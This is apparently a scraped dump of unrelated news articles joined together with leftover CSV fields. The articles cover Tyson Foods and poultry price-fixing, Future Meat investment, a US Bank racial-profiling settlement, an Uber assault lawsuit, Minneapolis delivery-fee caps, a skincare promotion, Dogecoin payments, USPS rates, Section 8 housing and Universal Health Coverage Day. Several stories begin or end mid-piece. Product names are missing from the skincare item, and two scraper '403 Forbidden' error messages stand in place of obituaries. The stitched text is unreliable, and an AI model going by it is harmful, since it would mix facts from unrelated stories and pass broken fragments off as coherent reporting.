Another friend a retired professor is (unsurprisingly really) even more iconoclastic: he reads Securities and Exchange Commission (SEC) corporate filings for fun. Honestly.

Why? Well first because he’s a nerd’s nerd and second because every now and then the professor stumbles across a brain-seizing gem like the one contained in the Oct. 2021 SEC filing by Tyson Foods.

“Many of our customers” reads Tyson’s 10-K a legally-mandated report “such as supermarkets warehouse clubs and food distributors have consolidated in recent years and consolidation is expected to continue throughout the United States and in other major markets.”

But “These consolidations” it continues “have produced large sophisticated customers with increased buying power who are more capable of operating with reduced inventories opposing price increases and demanding lower pricing increased promotional programs and specifically tailored products.”

Wait an Arkansas minute is Tyson Foods the proverbial Big Chicken of Big Big Meat warning shareholders of a possible market flop to newly “sophisticated consolidators” like “warehouse clubs” such as Walmart’s Sam’s Club and Costco?

Maybe because worrisomely “These customers also may use shelf space currently used for our products for their own private label products.”

There’s no “may” to it; many are already doing it.

Indeed in 2019 Costco began pushing the construction of a captive poultry supply chain – from contract chicken growers through its in-store chicken rotisseries – in eastern Nebraska for all retail stores west of the Mississippi River including Hawaii.

At the same time and a day’s drive east Walmart (as noted in this space in March 2019) already had “Walmart-contracted truckers hauling Walmart-contracted milk to a Walmart bottling plant that Walmart will then process and haul to Walmart stores on Walmart trucks to sell directly to Walmart customers.”

Tyson’s public recognition that its market power is being bled away by some of its biggest customers rather than some of its fiercest competitors came just weeks before several poultry company executives went on trial in Denver federal court for alleged price fixing in U.S. poultry markets.

Could these two events be simple serendipity or is there a connection between the meatpackers’ eroding pricing power and the systemic price-fixing the U.S. Department of Justice (DOJ) alleges occurred for several years between poultry slaughterers?

The DOJ doesn’t say but according to an Oct. 25 report by Forbes the department is more than emphatic in its investigation of “price-fixing on a mass scale… across the [poultry] industry’s top 18 companies which are responsible for some 99% of commercial chicken sold.”

Some of Big Chicken’s biggest customers however suspected something was wrong in the poultry market and they were angrier than a flock of wet hens. The angriest it appears was KFC the global chicken fast food chain.

According to early November testimony at the Denver trial one prosecution witness “told of an alleged interaction between (one) KFC” official who told a poultry company’s “executives that ‘he was going to beat us down with a hammer and baseball bat’ as payback for three years of high chicken prices.”

Hammers and bats aside end users like KFC Costco and Walmart – unlike hog farmers ranchers and poultry growers – increasingly have alternatives to giant meatpackers: they are establishing captive supply chains to provide their own customers with their own products.

And sure farmers and ranchers will still be part of those new chains but they’ll still be “chained” to the same now decades-old flow of market power – upward toward the retailer not backwards toward the farmer and rancher.

But it may take time for Tyson historically a chicken company to get used to the ages-old farm idea that what’s good for the goose is good for the gander.

Product developers are working to formulate applications and flavor profiles that give consumers permission to consume more protein-centric meat snacks at different times during the day.

While sticks and jerky formats still dominate the market manufacturers are bringing bars and bites to the category that not only target adults but children as well. Hillshire Farm Snacked from Tyson Foods Inc. is one product seeking to catch the attention of parents and children.

“Protein snacks are one of the most popular snack foods consumed and we know protein helps keep kids full making it an ideal component of a snack” said Noelle O’Mara group president of Tyson Foods. “Hillshire Farm Snacked is an easy portable and delicious snack that fits in with today’s parents’ and kids’ on-the-go lifestyle.

“The reality of kids’ lunches today is that parents are serving a collection of snacks — versus a main dish like a sandwich and sides. With Hillshire Farm Snacked we saw an opportunity to create a product line that fits this reality …”

The massive round by any measure and in particular by foodtech standards will make Future Meat the most valuable Israeli company in its sector by a wide margin.

U.S. food giants Tyson Foods and ADM who both participated in Future Meat’s $26.75 million Series B in February of this year are both expected to be part of the upcoming round as well. Tyson Foods is the world’s second largest meat manufacturer while ADM a multinational food processing and commodities trading corporation is currently traded on the New York Stock Exchange at a $35 billion valuation. Other investors in the company include Müller Group and Rich's Products Corporation alongside leading venture capital investors such as S2G Ventures ADM Capital Emerald Technology Ventures Manta Ray Ventures and Bits x Bites.

Future Meat’s technology is based on the rapid natural proliferation of connective tissue cells. What’s unique about their process is that unlike most artificially-grown meat it does not require the expensive use of stem cells. Its technology is based on the work of its chief scientist Prof. Yaakov Nahmias from the Hebrew University of Jerusalem. The company’s CEO is Rom Kshuk.

The huge upcoming round is meant to fund among other things the building of a manufacturing plant in the U.S. Future Meat  founded in 2018 is planning on offering its products to the wide public at relatively lower prices compared to current meat substitutes.

The company announced in June the opening of the world's first industrial cultured meat facility. The facility located near its headquarters in Rehovot is capable of producing 500 kilograms of cultured products a day equivalent to 5000 hamburgers.

""This facility opening marks a huge step in Future Meat Technologies' path to market serving as a critical enabler to bring our products to shelves by 2022"" said Rom Kshuk at the time. ""Having a running industrial line accelerates key processes such as regulation and product development.""

Currently the facility can produce cultured chicken pork and lamb without the use of animal serum or genetic modification (non-GMO). The facility further supports Future Meat Technologies' larger efforts to create a more sustainable future. The company's cruelty-free production process is expected to generate 80% less greenhouse emissions and use 99% less land and 96% less freshwater than traditional meat production.

Future Meat Technologies aims to reach shelves in the United States in 2022 and is currently in the process of approving its production facility with regulatory agencies in multiple territories. The company is eyeing several locations in the United States for its projected expansion. Future Meat is planning a $2 billion funding round when it begins its marketing push in 2022."

A bank manager said he called police because he thought the man had a fake pay check the report said.

The 23-year-old and the bank reached a confidential settlement following the incident according to the report.

A Black man reached a settlement with US Bank after he said he was racially profiled during an incident last year where he was handcuffed by police after an employee at a Minnesota branch accused him of trying to cash a fake check.

Joe Morrow 23 went to cash a check at a US Bank branch in Columbia Heights last year after he worked a 12-hour shift at his job at a grocery distributor according to an investigation by KSTP-TV. A bank manager identified in the report as John Askwith called the police after he said he suspected the $900 check was fraudulent.

According to KSTP-TV Morrow who had an account with the bank and showed identification to the teller claimed Askwith said ""You people always coming in here with fake checks.""

Body camera footage obtained by the outlet shows the moment Morrow was handcuffed by officers inside the establishment despite his having an account with the bank and showing them identification.

""When I'm coming out of [the manager's] office I was handcuffed… people were looking… like I'm a criminal or something"" Morrow told KSTP-TV.

US Bank did not immediately respond to Insider's request for comment.

Before he was handcuffed Morrow was seated inside of Askwith's office where he told him that he worked for his employer and that he believed this was a ""racial"" situation. An officer who responded to the scene was inside the room during this exchange.

""Joe I need you to calm down first of all OK?"" Sgt. Justin Pletcher could be heard saying in the footage according to the outlet. ""Don't say anything stupid because you're just going to get arrested for it.""

KSTP-TV reported that after another officer arrived at the scene Morrow was handcuffed and moved to a different office.

The bank manager appeared to call Morrow's employer for verification only after police arrived and escorted him out of the office according to the body camera footage KSTP-TV reported.

Pletcher's incident report said that Morrow ""flexed"" at Askwith ""in a threatening manner"" however Morrow disputed that claim the local news outlet reported. The bank manager told police that he had received ""a lot of fraudulent checks"" with the employer's logo on them the report said.

The body camera footage showed Morrow was eventually released from the handcuffs and was debriefed by Sgt. Pletcher according to the report adding that the officer later apologized as they were leaving the bank.

The outlet reported that Morrow and US Bank agreed to a confidential settlement.

Andy Cecere the president and chief executive officer of US Bancorp issued an apology to the Minneapolis community in a letter on Friday stating that ""I am deeply sorry for where we failed and accept full responsibility.""

The letter continued: ""What Mr. Morrow experienced is not the experience any customer should have. All of our employees including executive management are required to complete two levels of unconscious bias training in addition to other training to prevent bias and negative customer experiences. Sometimes unfortunately we don't live up to our goals.""

According to the letter the company is reworking their training programs to ensure that a similar situation does not happen in the future.

Read more

It’s the stuff of nightmares: After a night drinking with friends a young woman hails an Uber for what she thinks will be a safe ride home. The driver sexually assaults her.

A Philadelphia woman alleges that’s what happened to her in October 2017 according to a civil lawsuit she has filed against the ride-sharing company and the driver.

Uber has disclosed it received nearly 6000 reports of sexual assault in 2017 and 2018. Meanwhile the rapid development of Uber Lyft and other platform-based companies in the sharing economy continues to challenge long-standing legal approaches and regulatory schemes across the country.

“The gist of the case is Uber promises safety” said J. Conor Corcoran a Center City lawyer representing the woman. “The ride did get her from point A to point B but it wasn’t safe. He wouldn’t have had the opportunity to take advantage of her without Uber’s facilitation.”

Uber’s promise reinforced in advertising corporate communications and social media campaigns at the time amounted to a warranty on which the woman relied and the company failed to deliver the lawsuit argues. It also contends that Uber did not do adequate vetting of drivers as it was growing rapidly and people flocked to the platform to work.

An Uber spokesperson said the company won’t comment on pending litigation. Its attorneys have not yet filed an answer to the suit. Uber says it’s always working to improve safety for users of its app but declined to talk about it on the record.

The ride-sharing company formerly required people who alleged sexual assault or harassment to submit their cases to binding arbitration private court-like hearings to settle disputes and to adhere to a nondisclosure agreement. But Uber changed that policy in 2018 under pressure from former employees and the public and as it was preparing to make an initial public stock offering.

Now the company says survivors are free to pursue claims in open court if they choose. In December 2019 Uber issued the report detailing the 6000 sexual-assault reports it had handled saying that it was “statistically extremely rare” but that even one incident was “unacceptable.” Uber is scheduled to release another report on assaults by the end of the year.

Competitor ride-sharing company Lyft issued its own report in October disclosing 4158 reported sexual assaults from 2017 through 2019. It ended its mandatory arbitration requirement right after Uber did.

On Oct. 6 2017 the Philadelphia woman was with friends at Time restaurant and bar on Sansom Street and about 2 a.m. used the Uber app on her smartphone to hail a ride to her North Philadelphia apartment about two miles away the suit says.

The driver came into the restaurant to meet her and escort her to his car the suit says. He put her in the front seat and she remembered nothing of the ride it says. She said she had been drinking but not enough to black out and believes the driver had drugged her drink inside the restaurant.

The complaint says the woman awoke in her apartment the next morning with the driver standing over her.

She had a sexual-assault forensic exam done and was interviewed by Philadelphia detectives who also took a sheet and towel with semen samples on them Corcoran said. He added that she never heard back from police.

The Philadelphia Police Department did not respond to questions about the case including whether there is an active investigation.

The woman through her lawyer declined to comment.

Uber has been shielded from legal liability in many cases because it classifies drivers as independent contractors rather than employees said Adam F. Scales a professor at Rutgers Law School in Camden who specializes in torts and insurance law.

“They have maintained they’re just a platform that puts people together” Scales said. “Obviously reality has undermined that some.”

But even in cases where judges rule drivers have the status of employee Uber has a “very strong” argument that “sexual assault which is horrific is not within the scope of duties of a driver” and the company can’t anticipate and be responsible for an individual’s assault Scales said.

On the other hand he said Uber could be assessed damages if it is proved that it did not do enough investigation of drivers before they joined the app or for insufficient monitoring of them.

The suit was initially filed in state court in late September but was transferred to federal District Court on Oct. 5 at Uber’s request because the parties are from different states. The company is headquartered in California and it and its subsidiaries are incorporated in Delaware.

In late October Corcoran moved to have the federal judge send the case back to the Court of Common Pleas in Philadelphia because the driver who is also a defendant is a resident of the state where the alleged actions took place.

There is no deadline by which the judge must rule. The suit does not specify the monetary damages the woman is seeking.",https://news.google.com/articles/CBMia2h0dHBzOi8vbnlwb3N0LmNvbS8yMDIxLzEyLzExL2FyaXpvbmEtaG9vcHMtZm9yY2VkLXRvLXRha2UtdWJlcnMtYWZ0ZXItZGVhZGx5LW1pZHdlc3Qtc3Rvcm0tZGl2ZXJ0cy1mbGlnaHQv0gEA?hl=en-US&gl=US&ceid=US%3Aen,Arizona basketball team forced to take Ubers after deadly Midwest storm diverts flight,"The University of Arizona men’s basketball team found themselves without a ride on Friday as a deadly storm system ripped through the Midwest.

The Wildcats’ flight on Friday night had to be diverted because of low visibility and a fleet of Ubers were needed to ensure the No. 11 team in the country arrived in time for a Saturday night showdown with 7-2 Illinois.

According to the Arizona Daily Star the Wildcats were on their way to the University of Illinois — Willard Airport when the visibility issues occurred. They circled around in the air and ended up landing in Indianapolis about 130 miles away.

According to the report the players and coaches piled into five Ubers that brought them to Illinois by about 10 p.m. local time. While the final price depends on demand Uber’s website estimates one of the rides for the two-hour trip would cost about $135.

The ordinance which was crafted by Council Member Lisa Goodman limits fees to 15% or less and also makes it unlawful for delivery companies to charge higher fees for additional services like advertising or order placement without consent from restaurants.

""This is really an attempt to help small independent restaurants in Minneapolis survive"" said Goodman who represents the Seventh Ward which includes much of downtown and part of Uptown home to many restaurants. ""Since there's an emergency regulation in place already it just extends the emergency regulation so nothing will change for the consumer.""

In December 2020 the city first imposed a fee cap to help restaurants hit hard by the COVID-19 pandemic stay afloat. That emergency order is slated to expire in February and city officials said there's urgency to make the caps – which have become common in many cities across the country – permanent as restaurants and customers continue to rely heavily on third-party food delivery apps.

Restaurant owners and businesses that support the ordinance said the caps have allowed them to hire and pay more staff. Some small restaurants raised concerns that once the emergency order was lifted companies would resume charging them 30% for services making it difficult for them to turn a profit.

""Capping [delivery companies] levels the playing field … Everybody has to play by the same rules"" said Sam Turner owner of the Nicollet Diner and Muffin Top Cafe in Minneapolis who asked the council to make the fee caps permanent. ""It will definitely go a long way to helping small independent operators.""

Food delivery companies and national lobbyists are pushing back saying the price controls can raise prices for consumers which in turn can reduce orders for restaurants and diminish earning opportunities for drivers. Uber Technology and its food delivery service app Uber Eats said in a letter to the City Council that the permanent regulations ""would make it difficult if not impossible"" for them to do business in Minneapolis.

In a statement to the Star Tribune DoorDash called the ordinance an interference that's ""detrimental to local economies"" and a violation of the U.S. and Minnesota constitutions. DoorDash is among the major food delivery companies that have sued New York City and San Francisco for making the pandemic fee regulations permanent.

""These controls will likely harm the customers delivery drivers and the very restaurants policymakers hope to support"" the company's spokeswoman Briana Megid said.",https://news.google.com/articles/CBMiP2h0dHBzOi8vd3d3LmZ0LmNvbS9jb250ZW50Lzk1ZTdmMTUwLWIwZjktNDYwMi04ZTVkLTc2YTEzOGI1OTg1MdIBAA?hl=en-US&gl=US&ceid=US%3Aen,Workers demand gig economy companies explain their algorithms,"Try unlimited access Only MX$100 for 4 weeks

Kate Hudson joined Jessica Alba on her Youtube beauty vlog to try out skincare products and chat about life.

One of her favorite products was the and it’s formulated with a bunch of good-for-you hydrating skincare ingredients.

“This is really interesting...that’s wild” said Hudson while applying the facial moisturizer all over her face.

Celebrities are some of the best people to turn to for inspiration when it comes to skincare. They have access to the world’s top dermatologists and are always using the best products to keep their complexions looking healthy and radiant.

The best part for us though is when they reveal the products they love using and one of our favorite celebs Kate Hudson just added a new facial cream to her list of finds. It’s the and it’s available to buy on .

Hudson made an appearance in a recent glam session for Jessica Alba’s Youtube channel where the two tried out skincare products from the brand (founded by Alba) and chatted about life while doing their beauty routines.

During the video Hudson applied the facial moisturizer and was immediately shocked by its formula. “This is really interesting” said Hudson as she rubbed the cream all over her face. Alba then explained that she could “feel the water breaking on her face” which Hudson said “that’s wild” in response to Alba.

The is designed to hydrate refresh and cool the skin without feeling too heavy when applied. Its formula is infused with many good-for-you skincare ingredients like hyaluronic acid squalene and jojoba esters.

“It’s over 70% water and it instantly makes you look hydrated plump and awake” said Alba.

The secret to its refreshing and hydrating boost is the two different types of hyaluronic acid in the formula. But both types are crafted to help bind and retain moisture in different layers of the skin according to the .

“Hyaluronic acid is commonly used as an ingredient in moisturizers because of its hydration benefits and can even help plump the skin to improve the appearance of fine lines” said Joshua Zeichner M.D. director of cosmetic and clinical research in dermatology at Mount Sinai Hospital in New York City said in a previous interview with Prevention.

And the moisturizer can be added to both your a.m. and p.m. routines—which helps you save space on your beauty counter! Plus it’s great for all skin types—and it’s under $20.

customers love the face cream as well giving it over 2900 5-star global ratings.

“I’m all about safer-for-you ingredients and this beautiful blend of ingredients in this cream creates a silky fluffy and rich texture” wrote one satisfied . “It absorbs perfectly—feels like my skin is drinking it up instead of leaving behind greasiness. I’ve been using it on my face and neck for several months and I’m constantly told my skin is glowing and that I look well-rested (and I can assure you I am not well-rested).”

“It gives me hydration and a glow that lasts all day and night but doesn’t break my skin out” added another reviewer. “It even fills in my fine lines and plumps them. It absorbs into my skin and preps it perfectly for makeup. This moisturizer is truly a game-changer!”

With approval from Hudson Alba and reviewers there’s only one thing you need to do—add the top-rated facial moisturizer to your cart and then check out some of the other Honest skincare picks Hudson enjoyed using.

This means that the holders of the hottest meme coin can now spend it at roughly 40000 stores across the U.S.



The extensive list of supported merchants includes video game seller GameStop luxury retailer Nordstrom home improvement company Lowe’s pet retailer Petco domestic merchandise and home furnishings company Bed Bath & Beyond beauty store chain Ulta Beauty and plenty of other major retailers.



Last month Knoxville-based movie theater chain Regal Cinemas also partnered with Flexa in order to accept cryptocurrencies.



Starbucks also participated in the app’s trial but was swiftly pulled from the list of available merchants in spite of the viral photo that shows the Winklevoss twins making a payment with the help of the app.

Crypto payments are facilitated with the help of Flexa’s Spedn cryptocurrency wallet was rolled out in 2019. It initially supported four cryptocurrencies: Bitcoin Bitcoin Cash Ethereum and the Gemini Dollar stablecoin.



In May Flexa also added Dogecoin the original canine meme coin to the lineup of available cryptocurrencies.

Did you know you could use Dogecoin to buy things at:



- GameStop

- Nordstrom

- Lowe’s

- Petco



And many more other stores? This piece of news went pretty unnoticed but it’s a big deal! :) https://t.co/DXX8qtL0Tz — Shibetoshi Nakamoto (@BillyM2k) May 18 2021

The network automatically converts cryptocurrencies into fiat so that retailers do not have to deal with volatility associated with cryptocurrencies. Instant payments are facilitated with the help of Amp an ERC-20 token that functions as crowdsourced collateral.

Newegg and AMC

Shiba Inu has been making significant inroads with merchant adoption over the past month.



Earlier this week electronics retailer Newegg made an announcement about accepting Shiba Inu payments earlier this week.



Movie theater giant AMC also plans to add Shiba Inu in early 2022 according to CEO Adam Aron.



Moreover Shiba Inu is also supported by BitPay the world’s largest provider of crypto payments.



Yet the price of the token is down 60.39% from its lifetime peak in spite of these major adoption milestones."

Not So Fast,"Will USPS rate hike drive online sellers to consider FedEx and UPS? EcommerceBytes spoke to several shipping analysts about the challenges shippers are facing across the board as carriers try to improve their revenue per shipment. Here’s what they had to say including advice on how to make the right decision about which carrier to consider for your online order fulfillment.

If the U.S. Postal Service gets its way it’s going to cost a lot more to send packages next year.

But those shipping increases painful as they may be aren’t likely to send online sellers scrambling to commercial carriers like UPS and FedEx.

That’s because those carriers are both raising rates next year by nearly 6 percent but within that headline number lie significant pricing variations that could drive costs even higher for sellers using certain shipping classes as well as other variables like package dimension and shipping zone.

“Regrettably for shippers the USPS isn’t the only one increasing their rates” Josh Dunham CEO of the shipping consultancy Reveel said in an email. “Both FedEx and UPS announced a 5.9 percent general rate increase for 2022.”

Reveel conducted an analysis of the commercial carriers’ rate increases modeling what its customers’ spending over the past year would look like under the new rates. More than 97 percent of shippers would see their rates increase by more than the general 5.9 percent increase FedEx and UPS announced Reveel found owing to the various additional surcharges and fees the carriers announced.

“Some companies will also be hit particularly hard” Dunham said. “For example we found that businesses that used FedEx’s Ground Economy formerly SmartPost – a shipping option aimed at small and medium-sized businesses – will see an average increase of 26 percent next year.”

Spokespeople for FedEx and UPS declined to comment on their shipping services in the context of the USPS rate increases. Representatives of both carriers cited company policies not to comment on other entities’ business activities.

As EcommerceBytes has reported the USPS rate increases like those announced by the commercial carriers will hit sellers in different ways. The agency is seeking regulatory approval for specific surcharges for packages exceeding certain length measurements for instance.

So just as with the commercial carriers USPS shippers will likely see their actual costs rise by more than the general announced rate increase of 3.1 percent according to an analysis by the shipping consultancy Shipware. Most USPS shippers will see their costs increase in the range of 5 percent to 8 percent according to Gordon Glazer a senior consultant with Shipware.

Still viewed alongside the announced rate increases at the commercial carriers the Postal Service seems like a comparative bargain.

“Compared to UPS and FedEx announced changes USPS is going after market share by keeping their price increase lower” Glazer wrote in a blog post breaking down the rate increases. “Still any way you slice and dice it the costs to ship continue to rise.”

The Postal Service remains an especially favorable option for sellers shipping light-weight packages to nearby zones according to Thomas Andersen partner and executive vice president with the shipping consultancy LJM Group.

“[For] some of that volume the Postal Service is absolutely the best answer” Andersen said in an interview.

Andersen’s company has been tracking the market movement of the commercial carriers finding that both FedEx and UPS – but especially UPS – have been trying to capture more of the small and midsize business market segment. When UPS reported its quarterly earnings in July the company said that small and midsize businesses accounted for 27 percent of its revenue up from 20 percent the year before.

“That’s a substantial jump in the amount of volume and spend” Andersen said adding that the move to attract smaller shippers reflects a strategy that UPS CEO Carol Tomé has articulated as “better not bigger.”

“Their goal is not to grow” Andersen said. “Their goal is to improve margins improve revenue per shipment.”

In general shippers need to have relatively high spending and volume levels before they can reach a negotiated contract with a commercial carrier that will be more economical than what they would spend at the Postal Service. But with rates balkanizing – shipping experts note that the proliferation of very specific fees and surcharges has made it harder to generalize about USPS or the commercial carriers’ announcements of rate changes – each seller needs to take a close look at their shipping operation to determine which service makes the most sense for their business.

“Every organization is different so it’s imperative for shippers to know their shipping profile” Dunham said.

“In its simplest form this is a summary of shipments sent and received that breaks them down by size weight and zone but a strong analysis will include data on a host of other categories” he added. “This information is absolutely crucial when comparing carriers.”",https://news.google.com/articles/CBMiUGh0dHBzOi8vb2JpdHMubm9sYS5jb20vdXMvb2JpdHVhcmllcy9ub2xhL25hbWUvbGVyb3ktdGhvbWFzLW9iaXR1YXJ5P2lkPTMxODE3MTE40gEA?hl=en-US&gl=US&ceid=US%3Aen,Leroy Thomas Obituary (2021) - River Ridge LA - The Times-Picayune,ERROR: Article `download()` failed with 403 Client Error: Forbidden for url: https://obits.nola.com/us/obituaries/nola/name/leroy-thomas-obituary?id=31817118 on URL https://news.google.com/articles/CBMiUGh0dHBzOi8vb2JpdHMubm9sYS5jb20vdXMvb2JpdHVhcmllcy9ub2xhL25hbWUvbGVyb3ktdGhvbWFzLW9iaXR1YXJ5P2lkPTMxODE3MTE40gEA?hl=en-US&gl=US&ceid=US%3Aen,https://news.google.com/articles/CBMiUGh0dHBzOi8vb2JpdHMubm9sYS5jb20vdXMvb2JpdHVhcmllcy9ub2xhL25hbWUvY29keS1sYWdhcmRlLW9iaXR1YXJ5P2lkPTMxODE2OTY10gEA?hl=en-US&gl=US&ceid=US%3Aen,Cody LaGarde Obituary (2021) - New Orleans LA - The Times-Picayune,ERROR: Article `download()` failed with 403 Client Error: Forbidden for url: https://obits.nola.com/us/obituaries/nola/name/cody-lagarde-obituary?id=31816965 on URL https://news.google.com/articles/CBMiUGh0dHBzOi8vb2JpdHMubm9sYS5jb20vdXMvb2JpdHVhcmllcy9ub2xhL25hbWUvY29keS1sYWdhcmRlLW9iaXR1YXJ5P2lkPTMxODE2OTY10gEA?hl=en-US&gl=US&ceid=US%3Aen,,,,,,

The show based on Stephanie Land’s book “Maid: Hard Work Low Pay and a Mother’s Will to Survive” is a portrait of poverty and domestic work in Washington State. Section 8 now known as the Housing Choice Voucher Programme ( HCVP ) is a federal housing-assistance scheme that subsidises rent for 2.3m poor American households lucky enough to get their hands on a voucher. Others can spend years on waiting lists hoping to be chosen.

Housing-policy wonks often refer to the voucher programme as a kind of lottery: win and your life may fundamentally change. When towering public-housing projects were demolished in the 1990s the Department of Housing and Urban Development ( HUD ) used vouchers as a way to house America’s poor through the private market. With a voucher tenants put 30% of their monthly income towards rent and the federal government covers the rest. Many people on voucher waiting lists are homeless or living with their families. Nearly half of all voucher-holders are black 70% are racial minorities and about a third earn less than $10000 a year.",,,,,,,,,,,,

Universal Health Coverage Day marks the anniversary of the United Nations’ historic and unanimous endorsement of a resolution in 2012 urging countries to accelerate progress towards universal health coverage (UHC) – aimed at ensuring that people can access the quality health services they need without suffering financial hardship.

The theme of this year’s campaign is “Leave no one’s health behind: Invest in health systems for all”. It reflects the vital importance of building stronger safer and fairer health systems that can provide essential health care services to all who need them in a timely manner despite the challenges posed by the COVID-19 pandemic.

Countries of WHO’s Eastern Mediterranean Region joined the global movement for UHC reinforcing their commitment to achieve UHC through the Salalah Declaration of 2018 and the United Nations High-Level Meeting on UHC in 2019. However progress since then has been mixed and the COVID-19 pandemic has represented a huge setback.

“The pandemic has exposed weaknesses in health systems globally and in the Eastern Mediterranean Region exacerbated health inequities and made the situation of vulnerable populations even more precarious. Health systems in our Region have been put under extreme pressure with severe disruption to immunization campaigns and other essential health services” Dr Ahmed Al-Mandhari WHO Regional Director for the Eastern Mediterranean said in a joint celebration co-hosted today by the World Health Organization (WHO) and the Ministry of Health and Prevention of the United Arab Emirates at EXPO 2020 Dubai.

In his speech during the opening of the celebration His Excellency Abdul Rahman Bin Mohammed Al Owais Minister of Health and Prevention in the United Arab Emirates thanked WHO for choosing the United Arab Emirates to host this global event to strengthen capacities step up efforts and take advantage of accumulated experiences and knowledge to bring about tangible changes to benefit humanity and public health.

""By hosting this event which coincides with the celebrations of the UAE’s 50th National Day in cooperation with WHO and Expo 2020 Dubai we are sending a positive message to revive hope and optimism for the world that we are able to build together a better and healthy future for generations to come and to promote equal opportunities in health services around the world which is a basic human right and a basic priority to achieve the Sustainable Development Goals"" added Al Owais.

The health minister affirmed the United Arab Emirates support for hosting joint international initiatives and events to promote UHC based on the values of fraternity human solidarity and equality of rights which are fundamental pillars of the country’s directions.

He shed light on the role played by the United Arab Emirates in supporting medical and humanitarian aid and vaccination campaigns around the world especially during the COVID-19 pandemic.

""The UAE has also demonstrated exceptional capabilities in pandemic management and governance thanks to the efficiency of its health system national resilience in coping with all changes and its global leadership in providing vaccines which contributed to preserving the state’s gains and international participation in planning the recovery phase of the COVID-19 pandemic"" Al Owais said in conclusion.

During his participation in the Walk the Talk event held earlier today as part of marking UHC day H.E. Abdulla Bin Mohamed Al Hamed Chairman of the Department of Health for the Emirate of Abu Dhabi said:

“I’m thrilled to be participating in this event right here in the heart of EXPO 2020 Dubai the important global platform that is shedding light on a range of prominent global topics. With the guidance of our wise leadership the United Arab Emirates continues to make endless efforts to ensure the readiness of broad health coverage for the community through advanced and integrated health insurance systems that enhance the quality and availability of services provided to members of society. Today we gather in the presence of local and international partners to exchange experiences and knowledge and discuss ways that will help improve our global efforts in providing advanced health care for global societies. We also recognize the pivotal role played by the frontline heroes in delivering health care to individuals while raising awareness of the importance of regular physical activity to improve and maintain the health of community members.”

The COVID-19 pandemic has demonstrated the critical need for preparedness in the face of health emergencies and highlighted huge disparities in countries’ abilities to cope with and recover from the crisis.

As of March 2021 43% of countries had reported disruption to primary health care while 45% had reported disruption to rehabilitative palliative and long-term care. Life-saving emergency critical and surgical interventions were affected in nearly one fifth of countries and more than two thirds of countries reported disruption to elective surgeries. A vast range of other services – from mental health to dental care cancer screening and family planning – have also suffered.

Community fear and mistrust travel restrictions and financial difficulties have provided significant challenges during the outbreak and services have also been hampered by supply-side problems especially staff shortages.

Universal Health Coverage Day this year includes a series of events from 12 to 16 December. In addition to the WHO/Ministry of Health and Prevention joint event Dubai Expo 2021 has dedicated a full day to celebrating key milestones in the journey towards UHC including the upcoming release of the Global monitoring report on universal health coverage 2021 the Global monitoring report on financial protection in health 2021 the Global expenditure report 2021 and the Global survey on health technology assessment and health benefit packages: interactive database and findings.

DUBAI/GENEVA/WASHINGTON DC — 12 December 2021 — New evidence compiled by the World Health Organization and the World Bank shows that the COVID-19 pandemic is likely to halt two decades of global progress towards Universal Health Coverage. The organizations also reveal that more than half a billion people are being pushed into extreme poverty because they have to pay for health services out of their own pockets.

The findings are contained in two complementary reports launched on Universal Health Coverage Day highlighting the devastating impact of COVID-19 on people’s ability to obtain health care and pay for it.

In 2020 the pandemic disrupted health services and stretched countries’ health systems beyond their limits as they struggled to deal with the impact of COVID-19. As a result for example immunization coverage dropped for the first time in ten years and deaths from TB and malaria increased.

The pandemic also triggered the worst economic crisis since the 1930s making it increasingly difficult for people to pay for care. Even before the pandemic half a billion people were being pushed (or pushed still further) into extreme poverty because of payments they made for health care. The organizations expect that that number is now considerably higher.

“There is no time to spare” said Dr Tedros Adhanom Ghebreyesus WHO Director-General. “All governments must immediately resume and accelerate efforts to ensure every one of their citizens can access health services without fear of the financial consequences. This means strengthening public spending on health and social support and increasing their focus on primary health care systems that can provide essential care close to home.”

He added: “Prior to the pandemic many countries had made progress. But it was not robust enough. This time we must build health systems that are strong enough to withstand shocks such as the next pandemic and stay on course towards universal health coverage.”

The new WHO/World Bank reports also warn that financial hardship is likely to become more intense as poverty grows incomes fall and governments face tighter fiscal constraints.

“Even before the COVID-19 pandemic struck almost 1 billion people were spending more than 10 per cent of their household budget on health” said Juan Pablo Uribe Global Director for Health Nutrition and Population World Bank. “This is not acceptable especially since the poorest people are hit hardest. Within a constrained fiscal space governments will have to make tough choices to protect and increase health budgets” he added.

In the first two decades of this century many governments had made progress on service coverage. In 2019 prior to the pandemic 68 per cent of the world’s population was covered by essential health services such as pre-and post-natal care and reproductive health services; immunization services; treatment for diseases like HIV TB and malaria; and services to diagnose and treat noncommunicable diseases like cancer heart conditions and diabetes.

But they had not made such advances in ensuring affordability. As a result the poorest groups and those living in rural areas are the least able to obtain health services and the least likely to be able to cope with the consequences of paying for them. Up to 90 percent of all households incurring impoverishing out-of-pocket health spending are already at or below the poverty line - underscoring the need to exempt poor people from out-of-pocket health spending backing such measures with health financing policies that enable good intentions to be realized in practice.

Besides the prioritizing of services for poor and vulnerable populations supported through targeted public spending and policies that protect individuals from financial hardship it will also be crucial to improve the collection timeliness and disaggregation of data on access service coverage out-of-pocket health spending and total expenditure. Only when countries have an accurate picture of the way that their health system is performing can they effectively target action to improve the way it meets the needs of all people.

Together these two new reports offer both a warning and guideposts to all countries as they strive to build back better from COVID-19 and keep their populations safe healthy and financially secure.

**World Bank Group Response to COVID-19

Since the start of the COVID-19 pandemic the World Bank Group has deployed over $157 billion to fight the health economic and social impacts of the pandemic the fastest and largest crisis response in its history. The financing is helping more than 100 countries strengthen pandemic preparedness protect the poor and jobs and jump start a climate-friendly recovery. The Bank is also supporting over 60 low- and middle-income countries more than half of which are in Africa with the purchase and deployment of COVID-19 vaccines and is making available $20 billion in financing for this purpose until the end of 2022.

Omo Nada hospital in Jimma Ethiopia is one of the hospitals which Cordaid has been supporting through our performance-based financing system. Let’s have a look at the work carried out by the hospital throughout the pandemic.

The hospital provides essential health services to almost 300000 people in the area. Among them is Saida Aba Bulgu: “I am about to give birth in this hospital for the second time. The hospital is like a mother to me” she explains.

Good quality maternal health services can greatly decrease maternal and infant mortality rate. But COVID-19 has heavily overstrained staff and the hospital had to cut back on the maternal services.

Ensuring universal health coverage during COVID-19

Globally the world has witnessed the ravage caused by a global health disaster with frontline health workers bearing most of its burden. The pandemic has disrupted health systems and society at large. It has halted or worse reversed years of progress towards eliminating other killer diseases such as malaria or tuberculosis and toward advancing sexual and reproductive health services for all.

This is why Universal health Coverage (UHC) bears more significance than ever. We know that health institutions are a complex machine to run let alone in low-income countries in the midst of a pandemic. At Omo Nada hospital performance-based financing (PBF) supports health workers and helps the facility to provide quality health services for all throughout the pandemic.

